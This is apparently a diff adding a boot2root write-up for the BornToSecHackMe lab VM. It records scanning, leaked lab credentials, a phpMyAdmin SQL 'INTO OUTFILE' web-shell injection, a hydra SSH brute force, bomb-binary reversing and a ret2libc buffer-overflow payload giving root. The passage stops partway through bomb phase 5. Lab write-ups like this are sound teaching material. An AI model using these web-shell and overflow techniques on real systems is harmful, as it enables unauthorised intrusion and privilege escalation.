@@ -1,1 +1,1729 @@
-writeup1
+# Abstract
+
+```console
+~>> sudo nmap -p- -sV -O 192.168.178.62
+~>> dirb https://192.168.56.101/
+```
+
+[**Forum**](https://192.168.56.101/forum/)  
+[Thread: Problem login?](https://192.168.56.101/forum/index.php?id=6)   <- Ctrl+f -> password (11/42)  
+[Forum login](https://192.168.56.101/forum/index.php?mode=login) <- lmezard:`!q\]Ej?*5K5cy*AJ`
+email from [profile](https://192.168.56.101/forum/index.php?mode=user&action=edit_profile) -> laurie<span></span>@borntosec.net
+
+[**Webmail**](https://192.168.56.101/webmail)  
+[Webmail login](https://192.168.56.101/webmail)  <- laurie<span></span>@borntosec.net:`!q\]Ej?*5K5cy*AJ`  
+[email with db access information](https://192.168.56.101/webmail/src/webmail.php)  -> root:`Fg-'kKXBj87E:aJ$`
+
+[**phpmyadmin**](https://192.168.56.101/phpmyadmin)  
+[phpmyadmin login](https://192.168.56.101/phpmyadmin) <- root:`Fg-'kKXBj87E:aJ$`  
+Go to "SQL tab" for webshell injection and inject:
+
+```sql
+SELECT "<pre><?php system($_GET[\'cmd\']) ?> <\pre>" INTO OUTFILE '/var/www/forum/templates_c/henneshell.php'
+```
+
+[Open webshell for credentials](https://192.168.56.101/forum/templates_c/henneshell.php?cmd=cat+../../../../home/LOOKATME/password) -> lmezard:`G!@M6f4Eatau{sF"`
+
+
+**FTP**
+```console
+madasanya:~>> ftp 192.168.56.101
+[...]
+Name (192.168.56.101:madasanya): lmezard
+[...]
+Password:
+[...]
+ftp> get fun
+[...]
+ftp> get README
+[...]
+```
+
+bruteforce password for user laurie
+
+```console
+madasanya:~>> bash getPassword.sh
+```
+
+User laurie
+`laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`
+
+```console
+madasanya:~>> ./bomb defusion
+[...]
+madasanya:~>> ./bomb defusion_secret
+[...]
+```
+
+User thor (typo corrected!)
+
+thor:`Publicspeakingisveryeasy.126241207201b2149opekmq426135`
+
+```console
+madasanya:~>> scp thor@192.168.56.101:turtle .
+madasanya:~>> python3 -m venv maggi
+madasanya:~>> cd maggi
+maggi >> source bin/activate
+(maggi) maggi >> python3 -m pip install turtle
+maggi >> bin/turtle.py
+```
+
+```console
+madasanya:~>> echo -n SLASH | md5sum | cut -f1 -d' '
+646da671ca01bb5d84dbb5fb2238dc8e
+```
+
+User zaz
+
+zaz:`646da671ca01bb5d84dbb5fb2238dc8e`
+
+```console
+madasanya:~>> ssh zaz@192.168.56.101
+zaz@BornToSecHackMe:~$ ls -l
+total 5
+-rwsr-s--- 1 root zaz 4880 Oct  8  2015 exploit_me
+drwxr-x--- 3 zaz  zaz  107 Oct  8  2015 mail
+zaz@BornToSecHackMe:~$ gdb exploit_me
+[...]
+(gdb) disas main
+[...]
+(gdb) break strcpy
+[...]
+(gdb) run exploiting_you
+[...]
+(gdb) print system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+(gdb) print exit
+$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
+(gdb) find &system,+987654321,"/bin/sh"
+0xb7f8cc58
+[...]
+zaz@BornToSecHackMe:~$ ./exploit_me `python -c 'print("A"*140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7")'`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`�����X��
+# whoami
+root
+```
+
+# Exploratory work
+
+## IP address
+
+<details>
+<summary> Bridge adapter setting
+</summary>
+
+The VM doesn't display its IP, but since my VM runs with the bridged adapter for the network, I can check from the admin page of my router.
+
+</details>
+
+<details>
+<summary> Host-only ethernet adapter setting
+</summary>
+
+If you can't find the IP address on your routers admin page, you can still switch your network from bridge adapter setting to host-only ethernet adapter setting of your VM.
+
+![image](https://media.discordapp.net/attachments/1059782199160868944/1059782572428754964/image.png)
+
+Don't forget to restrict the address range, so that your IP address lower and upper bound are the same. This will be the IP address that will be used for further actions. 
+
+![image](https://media.discordapp.net/attachments/1059782199160868944/1059782849022144553/image.png)
+
+</details>
+
+## Port scan
+
+<details>
+<summary> nmap
+</summary>
+Now checking the ports on the VM.
+
+```console
+henne@DESKTOP-41RB20U:~$ sudo nmap -p- -sV -O 192.168.178.62
+Password:
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-03 19:11 CET
+Nmap scan report for BornToSecHackMe.fritz.box (192.168.178.62)
+Host is up (0.0044s latency).
+Not shown: 65529 closed tcp ports (reset)
+PORT    STATE SERVICE  VERSION
+21/tcp  open  ftp      vsftpd 2.0.8 or later
+22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
+143/tcp open  imap     Dovecot imapd
+443/tcp open  ssl/http Apache httpd 2.2.22
+993/tcp open  ssl/imap Dovecot imapd
+MAC Address: 08:00:27:DE:E1:7A (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X
+OS CPE: cpe:/o:linux:linux_kernel:3
+OS details: Linux 3.2 - 3.16
+Network Distance: 1 hop
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 26.68 seconds
+```
+</details>
+
+
+As port 80 is open, we can check what's on there from the browser.
+
+![hackme](https://user-images.githubusercontent.com/70098821/210267928-67787d32-6dfa-48d1-b30a-306c96909146.JPG)
+
+using this wordlist: https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt
+
+responsecodes from http: https://null-byte.wonderhowto.com/forum/http-request-request-methods-and-http-response-codes-0179947/
+
+***
+
+## Dirb
+
+<details>
+<summary> https
+</summary>
+
+from the https scan with dirb the following entries seem to be very interesting and we want to have a closer look at them
+
+```console
+madasanya:vulns>>dirb https://192.168.56.101/
+
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Tue Jan  3 18:33:24 2023
+URL_BASE: https://192.168.56.101/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: https://192.168.56.101/ ----
+[...]
+==> DIRECTORY: https://192.168.56.101/forum/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/
+[...]
+==> DIRECTORY: https://192.168.56.101/webmail/
+[...]
+```
+</details>
+
+***
+
+### Forum
+<details>
+<summary> Log analysis
+</summary>
+
+Opening the link to the forum [https://192.168.56.101/forum/](https://192.168.56.101/forum/) reveals the following view:
+
+![image](https://user-images.githubusercontent.com/64751701/210801281-3fb18c30-2214-4dc6-88ce-618363c4341c.png)
+
+On the very right side of the site we can also see registered forum members:
+
+![image](https://user-images.githubusercontent.com/64751701/210801739-b6e5b880-e6e8-4465-ae09-159ae74530ef.png)
+
+From the forum entries the one with the title _Promblem login ?_ gives us interesting information:
+
+![image](https://user-images.githubusercontent.com/64751701/210416615-d139cede-5275-486a-a0f0-1681bd87b053.png)
+
+It seems that the user _lmezard_ (the next login attempt is done by this user) by accident typed in first his password `!q\]Ej?*5K5cy*AJ` and not the username.
+
+It is possible to log in with that user and post on the forum. Also we can see the profile details and get the user email.
+
+![image](https://user-images.githubusercontent.com/64751701/210803970-352a72fa-d809-4a32-b4e9-d2f806ce388e.png)
+
+</details>
+
+
+### Webmail
+<details>
+<summary> DB Access
+</summary>
+
+From the found dirb https output check [https://192.168.56.101/webmail](https://192.168.56.101/webmail) we open the site and enter the email _laurie@borntosec.net_ and the password `!q\]Ej?*5K5cy*AJ` of user _lmezard_.
+
+![image](https://user-images.githubusercontent.com/64751701/210804828-1210e513-30ee-45fd-9905-379360709c50.png)
+
+![image](https://user-images.githubusercontent.com/64751701/210805080-707142dc-69fe-4bb3-a2d4-6d6665ea7b38.png)
+
+One of the mails gives us further hints:
+
+Email contents _DB Access_: 
+
+```
+Hey Laurie,
+
+You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
+
+Best regards.
+```
+
+</details>
+
+### phpmyadmin
+
+<details>
+<summary> Login
+</summary>
+
+
+Use this information to login to [192.168.56.101/phpmyadmin](192.168.56.101/phpmyadmin) with _root_ and pw `Fg-'kKXBj87E:aJ$`
+
+![image](https://user-images.githubusercontent.com/64751701/210805431-703ed6d2-e26e-4857-9092-0e06f8496353.png)
+
+</details>
+
+<details>
+<summary> Web shell SQL injection
+</summary>
+
+Check if it this one: https://nvd.nist.gov/vuln/detail/CVE-2010-3056
+
+Via the SQL Search of the DB we can inject a script that upon calling will open a web shell, that we then can use for further exploits.[[yyy](https://www.securitynewspaper.com/2020/11/30/how-to-hack-mysql-databases-pentesting-phpmyadmin/)]
+
+![image](https://user-images.githubusercontent.com/70098821/213929284-320ea0e4-ff30-4e95-9339-67a9311aeb46.png)
+
+```console
+SELECT "<pre><?php system($_GET[\'cmd\']) ?> <\pre>" INTO OUTFILE '/var/www/forum/templates_c/henneshell.php'
+```
+
+We now can open the web shell with `https://192.168.56.101/forum/templates_c/henneshell.php`
+
+Here we can use shell commands by setting the `cmd` variable to the command we want to use. With this we can figure out who we are, where we are and even navigate through the file-system and see its contents. 
+
+`https://192.168.56.101/forum/templates_c/henneshell.php?cmd=pwd`
+
+In the `/home` directory we find a subdirectory called `LOOKATME`, which contains a file called `password`.
+
+`https://192.168.56.101/forum/templates_c/henneshell.php?cmd=cat+../../../../home/LOOKATME/password`
+
+The contents of this file are `lmezard:G!@M6f4Eatau{sF"`, which looks like FTP credentials.
+
+</details>
+
+<details>
+<summary> FTP
+</summary>
+
+We can log in as follows and search for files. These we can sent directly to our actual machine for further analysis.
+
+```console
+madasanya:~>> ftp 192.168.56.101
+Connected to 192.168.56.101.
+220 Welcome on this server
+Name (192.168.56.101:madasanya): lmezard
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> pass
+Passive mode on.
+ftp> ls
+227 Entering Passive Mode (192,168,56,101,127,123).
+150 Here comes the directory listing.
+-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
+-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
+226 Directory send OK.
+ftp> get fun
+local: fun remote: fun
+227 Entering Passive Mode (192,168,56,101,102,160).
+150 Opening BINARY mode data connection for fun (808960 bytes).
+226 Transfer complete.
+808960 bytes received in 0.08 secs (9.3219 MB/s)
+ftp> get README
+local: README remote: README
+227 Entering Passive Mode (192,168,56,101,229,228).
+150 Opening BINARY mode data connection for README (96 bytes).
+226 Transfer complete.
+96 bytes received in 0.00 secs (37.4252 kB/s)
+ftp> exit
+221 Goodbye.
+```
+</details>
+
+## ./fun
+<details>
+<summary> script analysis
+</summary>
+
+If we log in with these credentials we find a `README` and a file called `fun`. To move on we need to crack this file! [[yyy]](https://www.wikihow.com/Use-FTP)
+
+When running `file fun` we get the information that it is an tar archive, so we need to unpack it with `tar -xf fun`.
+Inside we now have a folder **ft_fun** which contains 750 files with the ending _.pcap_. Upon trying to open it with wireshark we get the error message that it is not a supported file. By running the `file` command again on one of these files we can see, that it is a simple ascii format.
+So let's have a look at the contents we can find here.
+
+An interesting part when analyzing the file `fun` is the main. It gives us further indications what to search for.
+```c
+int main() {
+	printf("M");
+	printf("Y");
+	printf(" ");
+	printf("P");
+	printf("A");
+	printf("S");
+	printf("S");
+	printf("W");
+	printf("O");
+	printf("R");
+	printf("D");
+	printf(" ");
+	printf("I");
+	printf("S");
+	printf(":");
+	printf(" ");
+	printf("%c",getme1());
+	printf("%c",getme2());
+	printf("%c",getme3());
+	printf("%c",getme4());
+	printf("%c",getme5());
+	printf("%c",getme6());
+	printf("%c",getme7());
+	printf("%c",getme8());
+	printf("%c",getme9());
+	printf("%c",getme10());
+	printf("%c",getme11());
+	printf("%c",getme12());
+	printf("\n");
+	printf("Now SHA-256 it and submit");
+}
+```
+
+For the function `getme9`to `getme12` we can find the characters `wnage` in the form of
+
+```c
+char getme12()
+{
+	return 'e';
+}
+```
+
+For the remaining 7 missing characters we don't have a function with a return value. But we have separated functions and separated return values.
+So the password probabably will contain the following characters `eahrIpt`. As also in an encryption tool like hashcat only the first character in brute force mode is from lower or capital letters, we will try this assumption here to. So from the characters `eahrpt` we have to create all possible combinations (6! = 720) and embed them between the other characters.
+
+</details>
+
+<details>
+<summary> Bruteforce password
+</summary>
+
+The script `getPassword.sh`in the project folder can be used to first run a program to brute force all possible combinations for our password. Afterwards they get hashed and we'll use hydra to see if one of them fits to the user _laurie_.
+You can find all the files are in the project folder.
+
+```console
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-17 17:32:36
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 720 login tries (l:1/p:720), ~180 tries per task
+[DATA] attacking ssh://192.168.56.101:22/
+[STATUS] 44.00 tries/min, 44 tries in 00:01h, 676 to do in 00:16h, 4 active
+[STATUS] 31.00 tries/min, 93 tries in 00:03h, 627 to do in 00:21h, 4 active
+[STATUS] 29.14 tries/min, 204 tries in 00:07h, 516 to do in 00:18h, 4 active
+[22][ssh] host: 192.168.56.101   login: laurie   password: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-17 17:41:15
+```
+
+</details>
+
+# BornToSecHackMe
+
+## User _laurie_
+
+### ./bomb
+
+<details>
+<summary> bomb detection
+</summary>
+
+Use `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4` to log in as user _laurie_ via ssh.
+
+In the home directory of our user _laurie_ we find two files. A `bomb` and a `README` which tells us to diffuse the bomb to get the password for the next user of the VM.
+
+Running the `bomb` program prompts us to move through six stages without failure and let's us enter some input.
+
+```console
+laurie@BornToSecHackMe:~$ ./bomb
+Welcome this is my little bomb !!!! You have 6 stages with
+only one life good luck !! Have a nice day!
+```
+</details>
+
+<details>
+<summary> bomb analysis
+</summary>
+
+Running it with `ltrace` provides little help, but we can check it out with `gdb`. 
+
+```console
+laurie@BornToSecHackMe:~$ gdb bomb
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/laurie/bomb...done.
+(gdb) disas main
+Dump of assembler code for function main:
+   0x080489b0 <+0>:	push   %ebp
+   0x080489b1 <+1>:	mov    %esp,%ebp
+   0x080489b3 <+3>:	sub    $0x14,%esp
+   0x080489b6 <+6>:	push   %ebx
+   0x080489b7 <+7>:	mov    0x8(%ebp),%eax
+   0x080489ba <+10>:	mov    0xc(%ebp),%ebx
+   0x080489bd <+13>:	cmp    $0x1,%eax
+   0x080489c0 <+16>:	jne    0x80489d0 <main+32>
+   0x080489c2 <+18>:	mov    0x804b648,%eax
+   0x080489c7 <+23>:	mov    %eax,0x804b664
+   0x080489cc <+28>:	jmp    0x8048a30 <main+128>
+   0x080489ce <+30>:	mov    %esi,%esi
+   0x080489d0 <+32>:	cmp    $0x2,%eax
+   0x080489d3 <+35>:	jne    0x8048a10 <main+96>
+   0x080489d5 <+37>:	add    $0xfffffff8,%esp
+   0x080489d8 <+40>:	push   $0x8049620
+   0x080489dd <+45>:	mov    0x4(%ebx),%eax
+   0x080489e0 <+48>:	push   %eax
+   0x080489e1 <+49>:	call   0x8048880 <fopen@plt>
+   0x080489e6 <+54>:	mov    %eax,0x804b664
+   0x080489eb <+59>:	add    $0x10,%esp
+   0x080489ee <+62>:	test   %eax,%eax
+   0x080489f0 <+64>:	jne    0x8048a30 <main+128>
+   0x080489f2 <+66>:	add    $0xfffffffc,%esp
+   0x080489f5 <+69>:	mov    0x4(%ebx),%eax
+   0x080489f8 <+72>:	push   %eax
+   0x080489f9 <+73>:	mov    (%ebx),%eax
+   0x080489fb <+75>:	push   %eax
+   0x080489fc <+76>:	push   $0x8049622
+   0x08048a01 <+81>:	call   0x8048810 <printf@plt>
+   0x08048a06 <+86>:	add    $0xfffffff4,%esp
+   0x08048a09 <+89>:	push   $0x8
+   0x08048a0b <+91>:	call   0x8048850 <exit@plt>
+   0x08048a10 <+96>:	add    $0xfffffff8,%esp
+   0x08048a13 <+99>:	mov    (%ebx),%eax
+   0x08048a15 <+101>:	push   %eax
+   0x08048a16 <+102>:	push   $0x804963f
+---Type <return> to continue, or q <return> to quit---
+   0x08048a1b <+107>:	call   0x8048810 <printf@plt>
+   0x08048a20 <+112>:	add    $0xfffffff4,%esp
+   0x08048a23 <+115>:	push   $0x8
+   0x08048a25 <+117>:	call   0x8048850 <exit@plt>
+   0x08048a2a <+122>:	lea    0x0(%esi),%esi
+   0x08048a30 <+128>:	call   0x8049160 <initialize_bomb>
+   0x08048a35 <+133>:	add    $0xfffffff4,%esp
+   0x08048a38 <+136>:	push   $0x8049660
+   0x08048a3d <+141>:	call   0x8048810 <printf@plt>
+   0x08048a42 <+146>:	add    $0xfffffff4,%esp
+   0x08048a45 <+149>:	push   $0x80496a0
+   0x08048a4a <+154>:	call   0x8048810 <printf@plt>
+   0x08048a4f <+159>:	add    $0x20,%esp
+   0x08048a52 <+162>:	call   0x80491fc <read_line>
+   0x08048a57 <+167>:	add    $0xfffffff4,%esp
+   0x08048a5a <+170>:	push   %eax
+   0x08048a5b <+171>:	call   0x8048b20 <phase_1>
+   0x08048a60 <+176>:	call   0x804952c <phase_defused>
+   0x08048a65 <+181>:	add    $0xfffffff4,%esp
+   0x08048a68 <+184>:	push   $0x80496e0
+   0x08048a6d <+189>:	call   0x8048810 <printf@plt>
+   0x08048a72 <+194>:	add    $0x20,%esp
+   0x08048a75 <+197>:	call   0x80491fc <read_line>
+   0x08048a7a <+202>:	add    $0xfffffff4,%esp
+   0x08048a7d <+205>:	push   %eax
+   0x08048a7e <+206>:	call   0x8048b48 <phase_2>
+   0x08048a83 <+211>:	call   0x804952c <phase_defused>
+   0x08048a88 <+216>:	add    $0xfffffff4,%esp
+   0x08048a8b <+219>:	push   $0x8049720
+   0x08048a90 <+224>:	call   0x8048810 <printf@plt>
+   0x08048a95 <+229>:	add    $0x20,%esp
+   0x08048a98 <+232>:	call   0x80491fc <read_line>
+   0x08048a9d <+237>:	add    $0xfffffff4,%esp
+   0x08048aa0 <+240>:	push   %eax
+   0x08048aa1 <+241>:	call   0x8048b98 <phase_3>
+   0x08048aa6 <+246>:	call   0x804952c <phase_defused>
+   0x08048aab <+251>:	add    $0xfffffff4,%esp
+   0x08048aae <+254>:	push   $0x804973f
+---Type <return> to continue, or q <return> to quit---
+   0x08048ab3 <+259>:	call   0x8048810 <printf@plt>
+   0x08048ab8 <+264>:	add    $0x20,%esp
+   0x08048abb <+267>:	call   0x80491fc <read_line>
+   0x08048ac0 <+272>:	add    $0xfffffff4,%esp
+   0x08048ac3 <+275>:	push   %eax
+   0x08048ac4 <+276>:	call   0x8048ce0 <phase_4>
+   0x08048ac9 <+281>:	call   0x804952c <phase_defused>
+   0x08048ace <+286>:	add    $0xfffffff4,%esp
+   0x08048ad1 <+289>:	push   $0x8049760
+   0x08048ad6 <+294>:	call   0x8048810 <printf@plt>
+   0x08048adb <+299>:	add    $0x20,%esp
+   0x08048ade <+302>:	call   0x80491fc <read_line>
+   0x08048ae3 <+307>:	add    $0xfffffff4,%esp
+   0x08048ae6 <+310>:	push   %eax
+   0x08048ae7 <+311>:	call   0x8048d2c <phase_5>
+   0x08048aec <+316>:	call   0x804952c <phase_defused>
+   0x08048af1 <+321>:	add    $0xfffffff4,%esp
+   0x08048af4 <+324>:	push   $0x80497a0
+   0x08048af9 <+329>:	call   0x8048810 <printf@plt>
+   0x08048afe <+334>:	add    $0x20,%esp
+   0x08048b01 <+337>:	call   0x80491fc <read_line>
+   0x08048b06 <+342>:	add    $0xfffffff4,%esp
+   0x08048b09 <+345>:	push   %eax
+   0x08048b0a <+346>:	call   0x8048d98 <phase_6>
+   0x08048b0f <+351>:	call   0x804952c <phase_defused>
+   0x08048b14 <+356>:	xor    %eax,%eax
+   0x08048b16 <+358>:	mov    -0x18(%ebp),%ebx
+   0x08048b19 <+361>:	mov    %ebp,%esp
+   0x08048b1b <+363>:	pop    %ebp
+   0x08048b1c <+364>:	ret
+End of assembler dump.
+(gdb)
+```
+</details>
+
+<details>
+<summary> bomb phase 1
+</summary>
+
+This tells us that the program is separated into six phases, which we can disassemble individually. 
+
+```console
+(gdb) disas phase_1
+Dump of assembler code for function phase_1:
+   0x08048b20 <+0>:	push   %ebp
+   0x08048b21 <+1>:	mov    %esp,%ebp
+   0x08048b23 <+3>:	sub    $0x8,%esp
+   0x08048b26 <+6>:	mov    0x8(%ebp),%eax
+   0x08048b29 <+9>:	add    $0xfffffff8,%esp
+   0x08048b2c <+12>:	push   $0x80497c0
+   0x08048b31 <+17>:	push   %eax
+   0x08048b32 <+18>:	call   0x8049030 <strings_not_equal>
+   0x08048b37 <+23>:	add    $0x10,%esp
+   0x08048b3a <+26>:	test   %eax,%eax
+   0x08048b3c <+28>:	je     0x8048b43 <phase_1+35>
+   0x08048b3e <+30>:	call   0x80494fc <explode_bomb>
+   0x08048b43 <+35>:	mov    %ebp,%esp
+   0x08048b45 <+37>:	pop    %ebp
+   0x08048b46 <+38>:	ret
+End of assembler dump.
+(gdb)
+```
+
+The `strings_not_equal` function checks if the input is equal to the expected solution and if not explodes the bomb/ends the program. So we only need to print the contents of the expected input which is later on compared. 
+
+```console
+(gdb) x/s 0x80497c0
+0x80497c0:	 "Public speaking is very easy."
+(gdb)
+```
+
+And there is our password for the first phase.
+</details>
+
+<details>
+<summary> bomb phase 2
+</summary>
+
+Disassembling phase_2 gives us 
+
+```console
+(gdb) disas phase_2
+Dump of assembler code for function phase_2:
+   0x08048b48 <+0>:	push   %ebp
+   0x08048b49 <+1>:	mov    %esp,%ebp
+   0x08048b4b <+3>:	sub    $0x20,%esp
+   0x08048b4e <+6>:	push   %esi
+   0x08048b4f <+7>:	push   %ebx
+   0x08048b50 <+8>:	mov    0x8(%ebp),%edx
+   0x08048b53 <+11>:	add    $0xfffffff8,%esp
+   0x08048b56 <+14>:	lea    -0x18(%ebp),%eax
+   0x08048b59 <+17>:	push   %eax
+   0x08048b5a <+18>:	push   %edx
+   0x08048b5b <+19>:	call   0x8048fd8 <read_six_numbers>
+   0x08048b60 <+24>:	add    $0x10,%esp
+   0x08048b63 <+27>:	cmpl   $0x1,-0x18(%ebp)
+   0x08048b67 <+31>:	je     0x8048b6e <phase_2+38>
+   0x08048b69 <+33>:	call   0x80494fc <explode_bomb>
+   0x08048b6e <+38>:	mov    $0x1,%ebx
+   0x08048b73 <+43>:	lea    -0x18(%ebp),%esi
+   0x08048b76 <+46>:	lea    0x1(%ebx),%eax
+   0x08048b79 <+49>:	imul   -0x4(%esi,%ebx,4),%eax
+   0x08048b7e <+54>:	cmp    %eax,(%esi,%ebx,4)
+   0x08048b81 <+57>:	je     0x8048b88 <phase_2+64>
+   0x08048b83 <+59>:	call   0x80494fc <explode_bomb>
+   0x08048b88 <+64>:	inc    %ebx
+   0x08048b89 <+65>:	cmp    $0x5,%ebx
+   0x08048b8c <+68>:	jle    0x8048b76 <phase_2+46>
+   0x08048b8e <+70>:	lea    -0x28(%ebp),%esp
+   0x08048b91 <+73>:	pop    %ebx
+   0x08048b92 <+74>:	pop    %esi
+   0x08048b93 <+75>:	mov    %ebp,%esp
+   0x08048b95 <+77>:	pop    %ebp
+   0x08048b96 <+78>:	ret
+End of assembler dump.
+(gdb)
+```
+
+To get additional insights into the bomb file and what exactly it is doing, we can decompile it.
+With IDA that is a paid feature, but [Ghidra](https://ghidra-sre.org/) offers that functionality too,
+without additional costs.
+
+For the next phase we can find the following code:
+
+```c
+void read_six_numbers(char *param_1,int param_2)
+
+{
+  int iVar1;
+  
+  iVar1 = sscanf(param_1,"%d %d %d %d %d %d",param_2,param_2 + 4,param_2 + 8,param_2 + 0xc,
+                 param_2 + 0x10,param_2 + 0x14);
+  if (iVar1 < 6) {
+    explode_bomb();
+  }
+  return;
+}
+
+```c
+void phase_2(undefined4 param_1)
+{
+  int iVar1;
+  int aiStack_20 [7];
+  
+  read_six_numbers(param_1,aiStack_20 + 1);
+  if (aiStack_20[1] != 1) {
+    explode_bomb();
+  }
+  iVar1 = 1;
+  do {
+    if (aiStack_20[iVar1 + 1] != (iVar1 + 1) * aiStack_20[iVar1]) {
+      explode_bomb();
+    }
+    iVar1 = iVar1 + 1;
+  } while (iVar1 < 6);
+  return;
+}
+```
+
+The function `read_six_numbers` just checks if we have passed minimum 6 numbers that are devided by a space and 
+stores them for further usage.
+
+`phase_2` just checks if the first number is a *1* (to determine a correct start) and from the README we know
+that the second number is a *2*.
+The further code of `phase_2` simply checks if the next number is the product of the actual number
+multiplied with the index of the following number.
+
+The code to defuse the bomb is therefore `1 2 6 24 120 720)`.
+
+</details>
+
+<details>
+<summary> bomb phase 3
+</summary>
+Let's also have a look at the decompiled code of phase_3:
+
+```c
+void phase_3(char *param_1)
+
+{
+  int iVar1;
+  char cVar2;
+  uint local_10;
+  char local_9;
+  int local_8;
+  
+  iVar1 = sscanf(param_1,"%d %c %d",&local_10,&local_9,&local_8);
+  if (iVar1 < 3) {
+    explode_bomb();
+  }
+  switch(local_10) {
+  case 0:
+    cVar2 = 'q';
+    if (local_8 != 0x309) {
+      explode_bomb();
+    }
+    break;
+  case 1:
+    cVar2 = 'b';
+    if (local_8 != 0xd6) {
+      explode_bomb();
+    }
+    break;
+  case 2:
+    cVar2 = 'b';
+    if (local_8 != 0x2f3) {
+      explode_bomb();
+    }
+    break;
+  case 3:
+    cVar2 = 'k';
+    if (local_8 != 0xfb) {
+      explode_bomb();
+    }
+    break;
+  case 4:
+    cVar2 = 'o';
+    if (local_8 != 0xa0) {
+      explode_bomb();
+    }
+    break;
+  case 5:
+    cVar2 = 't';
+    if (local_8 != 0x1ca) {
+      explode_bomb();
+    }
+    break;
+  case 6:
+    cVar2 = 'v';
+    if (local_8 != 0x30c) {
+      explode_bomb();
+    }
+    break;
+  case 7:
+    cVar2 = 'b';
+    if (local_8 != 0x20c) {
+      explode_bomb();
+    }
+    break;
+  default:
+    cVar2 = 'x';
+    explode_bomb();
+  }
+  if (cVar2 != local_9) {
+    explode_bomb();
+  }
+  return;
+}
+```
+
+The `sscanf` function indicates that the code contains a number, then a character and then again a number, devided
+by a space.
+When looking into the hint for that level, we know that the second value is the character `b`. So let's focus on
+the switch cases that also test the cases, where our second value is a `b`. This are the cases (and therefore our first value)
+1, 2 and 7. The third argument is checked within that cases (hex value) and needs to match the first value respectively.
+The possible solutions to defuse the bomb are
+
+```console
+1 b 214
+2 b 755
+7 b 524
+```
+</details>
+
+<details>
+<summary> bomb phase 4
+</summary>
+
+The decompiling for phase_4 gives us the following code:
+
+```c
+int func4(int param_1)
+
+{
+  int iVar1;
+  int iVar2;
+  
+  if (param_1 < 2) {
+    iVar2 = 1;
+  }
+  else {
+    iVar1 = func4(param_1 + -1);
+    iVar2 = func4(param_1 + -2);
+    iVar2 = iVar2 + iVar1;
+  }
+  return iVar2;
+}
+```
+
+```c
+void phase_4(char *param_1)
+
+{
+  int iVar1;
+  int local_8;
+  
+  iVar1 = sscanf(param_1,"%d",&local_8);
+  if ((iVar1 != 1) || (local_8 < 1)) {
+    explode_bomb();
+  }
+  iVar1 = func4(local_8);
+  if (iVar1 != 0x37) {
+    explode_bomb();
+  }
+  return;
+}
+```
+
+`phase_4` needs minimum one argument of type number. This is then passed to a function and the return value is
+compared with the number *55*.
+When having a closer look at the function `func4`, we can see that it returns the [Fibonacci sequence](https://en.wikipedia.org/wiki/Fibonacci_number) value of a given number.
+
+To get 55 out of it and defuse the bomb we need to enter the value `9`.
+
+</details>
+
+<details>
+<summary> bomb phase 5
+</summary>
+
+Let's take a look at the decompiled code. 
+
+```c
+void phase_5(int param_1)
+
+{
+  int iVar1;
+  undefined local_c [6];
+  undefined local_6;
+  
+  iVar1 = string_length(param_1);
+  if (iVar1 != 6) {
+    explode_bomb();
+  }
+  iVar1 = 0;
+  do {
+    local_c[iVar1] = (&array.123)[(char)(*(byte *)(iVar1 + param_1) & 0xf)];
+    iVar1 = iVar1 + 1;
+  } while (iVar1 < 6);
+  local_6 = 0;
+  iVar1 = strings_not_equal(local_c,"giants");
+  if (iVar1 != 0) {
+    explode_bomb();
+  }
+  return;
+}
+```
+
+This phase takes exactly six characters as input or explodes the bomb otherwise, as we can see in the `string_length` call. 
+
+Afterwards it shifts each character of our input string with bitwise & and `0xf` and uses the output as an index for an array called `array.123`, which contains `isrveawhobpnutfg` and stores the corresponding character in another string. That string is then compared to the word `giants`. 
+
+For us this means that we need to figure out which input gives us the appropriate index for `array.123` so that the output of the loop is "giants". We can use a little [script](https://github.com/Madasanya/boot2root/blob/main/phase_5.c) that gives us the shifted output, which we can match to each character of the alphabet and create our input string like that.
+
+`abcdefghijklmnopqrstuvwxyz`
+
+`srveawhobpnutfgisrveawhobp`
+
